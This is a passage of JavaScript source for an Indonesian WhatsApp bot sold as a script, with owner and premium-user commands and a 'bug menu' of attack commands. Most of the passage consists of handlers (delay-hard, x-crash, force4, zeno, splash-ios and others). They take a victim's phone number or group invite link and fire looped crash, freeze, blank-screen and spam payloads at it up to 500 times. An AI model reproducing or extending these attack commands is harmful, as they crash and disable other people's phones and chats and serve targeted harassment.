                "buttonParamsJson": `{\"display_text\":\"🛍 Buy Script\",\"url\":\"https://wa.me/6281250555198\",\"merchant_url\":\"https://www.google.com\"}`
             },
             {
                "name": "cta_url",
                "buttonParamsJson": `{\"display_text\":\"🐉Saluran Official\",\"url\":\"https://whatsapp.com/channel/0029VbBNmxb7dmefdL7bk70U\",\"merchant_url\":\"https://www.google.com\"}`
             }
          ],
         })
       })
   }
 }
}, {})

await ziole.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
}
break
//========[ Others Menu ]========//
case 'ownermenu' : {
await ziole.sendMessage(m.chat, { react: { text: `✨`, key: m.key }});
fitursc = 
`
   *Owner Menu*       
> ➳ .addowner   
> ➳ .delowner   
> ➳ .addprem  
> ➳ .delprem   
> ➳ .public   
> ➳ .riset
> ➳ .statusbot   
> ➳ .autotyping-on   
> ➳ .autotyping-off   
> ➳ .hidetag   
> ➳  .kick   
`
await ziole.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/fzhktx.png' }, caption: fitursc ,
  footer: "Modul V2",
  buttons: [
    {
      buttonId: '.belisc',
      buttonText: {
        displayText: '𝙱𝙴𝙻𝙸 𝚂𝙲'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '𝙰𝚂𝚂𝙰𝙸𝙽𝚅𝟷'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝙰𝚂𝚂𝙰𝙸𝙽𝚅𝟷',
          sections: [
            {
              title: namaowner,
              highlight_label: 'powered by :𝙰𝚂𝚂𝙰𝙸𝙽',
              rows: [
                {
                  header: 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ',
                  title: 'menu',
                  description: 'untuk kembali ke menu utama',
                  id: '.back',
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴᴜ',
                  title: 'MODUL ATTACK',
                  description: 'untuk menampilkan menu bug menu',
                  id: '.MODUL ATTACK',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Bug Menu ]========//
case 'bugmenu' : case 'MODULATTACK' :{
await ziole.sendMessage(m.chat, { react: { text: `✨`, key: m.key }});
bugmenu = 
`
prefix = / 

pakenya bukan .command makanya baca dongo
┍───[freze & delay]
│ ⌬ delay-hard            
│ ⌬ x-stun                
│ ⌬ stun1                 
│ ⌬ stun2  
┕───

╔───────[ BUG BLANK & FORCE ]───────╗
│ ⌬ system-blank          
│ ⌬ splash-ios            
│ ⌬ assain-force          
│ ⌬ x-lana                
│ ⌬ zeyy                 
│ ⌬ cihuy                 
┕───────

╔───────[ BUG DELAY ]───────╗
│ ⌬ x-crash              
│ ⌬ ziole               
│ ⌬ invis                
│ ⌬ delaymaker           
│ ⌬ assain-attack-delay  
┕────────────────────────

╔───────[ BUG GROUP ]───────╗
│ ⌬ 🔥 gunakan dalam gb   
│ ⌬ 😡 gunakan dalam gb   
│ ⌬ 😵 gunakan dalam gb   
│ ⌬ 👋 gunakan dalam gb   
┕────────────────────────

beta menu
╔───────[ BUG BLANK & FORCE ]───────╗
│ ⌬ func1          
│ ⌬ test2            
│ ⌬ puasin          
│ ⌬ zeno                
│ ⌬ zenid                
│ ⌬ force4                 
┕───────

by ziole & zeyy
jangan ban mulu,pengecut lu 
`
await ziole.sendMessage(m.chat, {
        image: { url: 'https://files.catbox.moe/fzhktx.png' },  caption: bugmenu ,
  footer: "",
  buttons: [
    {
      buttonId: '.belisc',
      buttonText: {
        displayText: '𝙱𝙴𝙻𝙸 𝚂𝙲'
      },
      type: 1,
    },
    {
    buttonId: 'action',
    buttonText: {
    displayText: '𝙰𝚂𝚂𝙰𝙸𝙽𝚅𝟷'
    },
    type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '',
          sections: [
            {
              title: namaowner,
              highlight_label: 'powered by : KapotID',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'untuk menampilkan fitur owner',
                  id: '.ownermenu',
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴᴜ',
                  title: 'MODUL ATTACK',
                  description: 'untuk menampilkan menu bug menu',
                  id: '.bugmenu',
                },
              ],
            },
          ],
        }),
      },
    },
  ],
  headerType: 1,
  viewOnce: true
}, { quoted: qtext2 })
ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/menu.mp3'), mimetype:'audio/mpeg', ptt: true});
}
break
//========[ Owner Fitur ]========//
case "addowner": case "addown": {
if (!isOwner) return zeyyreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return zeyyreply(`Nomor ${orang.split("@")[0]} Sudah Ada Di Database Owner`)
if (orang == botNumber) return zeyyreply("Tidak Bisa Menambahkan Nomor Bot Kedalam Database Owner Tambahan!")
let check = await ziole.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return zeyyreply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
zeyyreply(`*Berhasil Menambah Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Ditambahkan Kedalam Database Owner`)
} else {
zeyyreply(example("@tag/6283XXX"))
}
}
break
case "delowner": case "delown": {
if (!isOwner) return zeyyreply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./database/owner.json", "[]")
return zeyyreply(`*Berhasil Menghapus Semua Owner Tambahan ✅*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return zeyyreply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return zeyyreply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owner2, null, 2))
m.reply(`*Berhasil Menghapus Owner ✅*
Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database Owner`)
} else {
zeyyreply(example("@tag/6283XXX"))
}
}
break
case "addprem": case "addpremium": {
if (!isOwner) return zeyyreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return zeyyreply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Sudah Terdaftar Di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./database/premium.json", JSON.stringify(premium))
zeyyreply(`*Berhasil Menambah Premium ✅*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return zeyyreply(example("@tag/62838XXX"))
}}
break
case "delprem": case "delpremium": {
if (!isOwner) return zeyyreply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return zeyyreply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
zeyyreply(`*Berhasil Menghapus Premium ✅*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return zeyyreply(example("@tag/62838XXX"))
}}
break
case "public": case "publik": {
if (!isOwner) return zeyyreply(msg.owner)
ziole.public = true
zeyyreply("Successfully changed bot mode to public")
}
break
case "riset": case "private": case "priv": case "prib": {
if (!isOwner) return zeyyreply(msg.owner)
ziole.public = false
zeyyreply("Successfully changed bot mode to private")
}
break
case "autotyping-off": {
if (!isOwner) return zeyyreply(msg.owner)
global.autoTyping = false
zeyyreply("Successfully turned off auto typing")
}
break
case "autotyping-on": {
if (!isOwner) return zeyyreply(msg.owner)
global.autoTyping = true
zeyyreply("Successfully turned on auto typing")
}
break
case "statusbot": {
var teks = `
> *Auto Typing :* ${global.autoTyping ? "*✅*" : "*❌*"}
> *Mode Public :* ${ziole.public ? "*✅*" : "*❌*"}
> *Runtime :* *${runtime(process.uptime())}*
> *Owner :* ${isOwner ? "*✅*" : "*❌*"}
> Premium :* ${isPremium ? "*✅*" : "*❌*"}
`
zeyyreply(teks)
}
break
case "hidetag": case "h": {
if (!isGroup) return zeyyreply(msg.group)
if (!isAdmin && !isOwner) return zeyyreply(msg.admin)
if (!m.quoted && !text) return zeyyreply(example("teksnya/replyteks"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
ziole.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "k": case "kik": case "kick": case "babi": {
if (!isGroup) return zeyyreply(msg.group)
if (!isBotAdmin) return zeyyreply(msg.adminbot)
if (!isAdmin && !isOwner) return zeyyreply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ziole.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => ziole.sendMessage(m.chat, {text: `Beban ilang 1`, mentions: [`${users}`]}, {quoted: m})).catch((err) => zeyyreply(err.toString()))
} else return zeyyreply(example('nomornya/@tag'))}
break
case "ai":
case "heckai":
 if (!args.length) {
 return zeyyreply("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *.ai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return zeyyreply("❌ AI tidak dapat memberikan jawaban.");
 }
 zeyyreply(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 zeyyreply("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break
//========[ Owner Fitur ]========//
case 'assain-attack-delay': {
    if (!botNumber) {
        return zeyyreply("> *Khusus Bot Anjing*");
    }
    
    if (!q) {
        return zeyyreply(`Wrong Usage.\nExample : ${prefix + command} https://chat.whatsapp.com/`);
    }

    let result = args[0].split('https://chat.whatsapp.com/')[1];
    let target = await ziole.groupAcceptInvite(result);
    
    zeyyreply(`*Success! x-grup sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});
        
        //Paramater
        await Carousel(target)
        await NativeC(target)
        await DocFc(target)
        await CallGc(target)
        await InvisiPayload(target)
        await NewIos(target, Ptcp = true)
        await crashui2(target, ptcp = false)
        await crashui2(target, ptcp = false)
        await MSGSPAM(target)
        await InvisibleLoadFast(target)
   }
break;
case 'delay-hard': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await Carousel(target)
    await NativeC(target)
    await DocFc(target)
    await DocFc(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await OverloadCursor(target, ptcp = true)
    await OverloadCursor(target, ptcp = true)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await Carousel(target)
    await NativeC(target)
    await Carousel(target)
    await NativeC(target)
    await InvisibleLoadFast(target)
    await InvisibleLoadFast(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await thunderblast_notif(target)
    await f10(target, Ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await DocFc(target)
    await DocFc(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await MSGSPAM(target)
    await Carousel(target)
    await NativeC(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'force4': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
    await zioleBlackout(target);
    await zioleFC(target);
    await zioleArmageddon(target);
    await zioleInvisibleFCiOS(terget);
    await zioleInvisibleDelay(target);
    await zioleInvisibleFCiOS(target);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'puasin': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
    await zioleBlackout(target);
    await zioleFC(target);
    await zioleArmageddon(target);
    await zioleInvisibleFCiOS(terget);
    await zioleInvisibleDelay(target);
    await zioleInvisibleFCiOS(target);
    await crashui2(target, ptcp = false);
    await XeonXRobust(target, Ptcp = true);
    await crashui2(target, ptcp = false);
    await Carousel(target);
    await NativeC(target);
    await thunderblast_notif(target);
    await f10(target, Ptcp = false);
    await invc2(target, ptcp = true);
    await invc2(target, ptcp = true);
    await BlankScreen(target, Ptcp = false);
    await crashui2(target, ptcp = false)
    await ForceLokasi(target, Ptcp = true);
    await sleep(2000)
    await ForceText(target, Ptcp = true);
    await BlankScreen(target, Ptcp = false)
    await thunderblast_notif(target)
    await thunderblast_doc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await crashui2(target, ptcp = false)
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await f10(target, Ptcp = false)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'zeno': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
    await zioleBlackout(target);
    await zioleFC(target);
    await zioleArmageddon(target);
    await zioleInvisibleFCiOS(terget);
    await zioleInvisibleDelay(target);
    await zioleInvisibleFCiOS(target);
    await crashui2(target, ptcp = false);
    await XeonXRobust(target, Ptcp = true);
    await crashui2(target, ptcp = false);
    await Carousel(target);
    await NativeC(target);
    await thunderblast_notif(target);
    await f10(target, Ptcp = false);
    await invc2(target, ptcp = true);
    await invc2(target, ptcp = true);
    await BlankScreen(target, Ptcp = false);
    await crashui2(target, ptcp = false)
    await ForceLokasi(target, Ptcp = true);
    await sleep(2000)
    await ForceText(target, Ptcp = true);
    await BlankScreen(target, Ptcp = false)
    await thunderblast_notif(target)
    await thunderblast_doc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await crashui2(target, ptcp = false)
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await f10(target, Ptcp = false)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'zenid': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
    await zioleBlackout(target);
    await zioleFC(target);
    await zioleArmageddon(target);
    await zioleInvisibleFCiOS(terget);
    await zioleInvisibleDelay(target);
    await zioleInvisibleFCiOS(target);
    await crashui2(target, ptcp = false);
    await XeonXRobust(target, Ptcp = true);
    await crashui2(target, ptcp = false);
    await Carousel(target);
    await NativeC(target);
    await thunderblast_notif(target);
    await f10(target, Ptcp = false);
    await invc2(target, ptcp = true);
    await invc2(target, ptcp = true);
    await BlankScreen(target, Ptcp = false);
    await crashui2(target, ptcp = false)
    await ForceLokasi(target, Ptcp = true);
    await sleep(2000)
    await ForceText(target, Ptcp = true);
    await BlankScreen(target, Ptcp = false)
    await thunderblast_notif(target)
    await thunderblast_doc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await crashui2(target, ptcp = false)
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await f10(target, Ptcp = false)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'func1': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
      await zioleArmageddon(target);
      await zioleBlackout(target);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'ziole': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 25; r++) {
    await ForceLokasi(target, Ptcp = true);
    await sleep(2000)
    await ForceText(target, Ptcp = true);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'crash': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await crashui2(target, ptcp = false)
    await Carousel(target)
    await NativeC(target)
    await thunderblast_notif(target)
    await f10(target, Ptcp = false)
    await invc2(target, ptcp = true)
    await invc2(target, ptcp = true)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'x-crash': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_notif(target)
    await BlankScreen(target, Ptcp = false)
    await crashui2(target, ptcp = false)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await thunderblast_doc(target)
    await f10(target, Ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'cihuy': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await BlankScreen(target, Ptcp = false)
    await thunderblast_notif(target)
    await thunderblast_doc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await crashui2(target, ptcp = false)
    await crashui2(target, ptcp = false)
    await XeonXRobust(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await f10(target, Ptcp = false)
    await LocSystem(target)
    await invc2(target, ptcp = true)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'zeyy': case 'cihuy': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 500; r++) {
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await Carousel(target)
    await NativeC(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await freezefile(target, VcardQuoted, Ptcp = true)
    await thunderblast_doc(target)
    await thunderblast_doc(target)
    await DocFc(target)
    await DocFc(target)
    await crashui2(target, ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'delay-combo': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`);

    //Paramater
  for (let i = 0; i < 10; i++) {
  await xatanicaldelayv2(isTarget, true);  
  await delayMakerInvisible(target); 
  await Nullvisible(target); 
  await xatanicaldelayv2(isTarget, true);  
  await delayMakerInvisible(target); 
  await Nullvisible(target); 
   await delay(500);
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case 'abdul': case 'arcode': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return zeyyreply(`The number starts with '0'. Replace it with the country code number.\n\nExample: ${isCmd} 62 xxx-xxxx-xxxx`);
    }

    let target = `${jidx}@s.whatsapp.net`;

    zeyyreply(`*Success! ${isCmd} sent to ${target}*`)
    ziole.sendMessage(m.chat, {audio: fs.readFileSync('./media/death.mp3'), mimetype:'audio/mpeg', ptt: true});

    //Paramater
    for (let r = 0; r < 100; r++) {
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await Carousel(target)
    await NativeC(target)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    await NewIos(target, Ptcp = true)
    await NewIos(target, Ptcp = true)
    await IosMJ(target, Ptcp = false)
    }
  console.log(chalk.red.bold("Success!"))
}
break;
case '🔥': case '😡': case '😵': case '👋': {
    if (!isOwner) return zeyyreply("*You are not a Premium User*");
    if (!botNumber) return zeyyreply("This Feature Only Send By Bot Number");

    ziole.sendMessage(m.chat, { react: { text: '🤫', key: m.key } });
    ziole.sendMessage(m.chat, { react: { text: '🤪', key: m.key } });
    ziole.sendMessage(m.chat, { react: { text: '😜', key: m.key } });
    ziole.sendMessage(m.chat, { react: { text: '😝', key: m.key } });
    ziole.sendMessage(m.chat, { react: { text: '🥶', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 150; r++) {
    await Carousel(m.chat);
    await NativeC(m.chat);
    await crashui2(m.chat);
    await DocFc(m.chat);
    await DocFc(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break;
case 'x-stun': case 'stun1': case 'stun2': {
    if (!isPremium) return zeyyreply("*You are not a Premium User*");
    if (!q) return zeyyreply(`Example Usage:\n ${isCmd} 62xx`);
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    
    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
